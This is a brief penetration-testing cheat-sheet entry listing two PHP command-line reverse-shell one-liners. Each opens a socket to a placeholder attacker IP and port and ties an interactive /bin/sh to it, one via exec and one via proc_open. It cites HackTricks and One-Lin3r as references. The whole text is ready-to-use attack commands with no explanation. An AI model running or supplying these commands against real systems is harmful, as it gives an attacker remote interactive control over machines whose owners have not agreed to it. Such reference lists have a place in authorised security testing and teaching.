# PHP

`$ php -r '$sock=fsockopen("<IP>", <PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`

`$ php -r '$sock=fsockopen("<IP>", <PORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)